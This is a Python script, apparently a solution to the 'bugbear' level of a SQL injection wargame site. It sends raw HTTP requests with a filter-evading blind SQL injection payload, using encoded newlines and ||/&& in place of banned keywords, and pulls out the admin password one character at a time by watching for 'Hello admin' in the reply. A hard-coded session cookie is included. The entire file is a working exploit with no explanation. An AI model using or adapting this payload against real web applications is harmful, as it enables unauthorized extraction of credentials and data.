import socket

array = ""
for n in range(1,9):
    for x in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("104.27.175.42", 80))
        data = "GET /bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=12345%0a%7c%7c%0a(not%0a(ord(right(left(pw,%0a" + str(n) + "),%0a1))%0a%3c%3e%0a" + str(ord(x)) + ")%0a%26%26%0anot%0a(id%0a%3c%3e%0a%22admin%22))%23&pw=1" + " HTTP/1.1\r\n" + \
                "Host: los.eagle-jump.org\r\n" + \
                "Cookie: __cfduid=dda4d8e6a10d2d630e0b224675adf7ff21489487743; PHPSESSID=7f9k1otik4u5tlf650brofubq4\r\n" + \
                "Referer: https://los.eagle-jump.org/gate.php\r\n" + \
                "\r\n"

        send.send(data.encode())
        recv = send.recv(1500)

        send.close()

        if "Hello admin" in recv.decode():
            array += x
            break

    print(array)
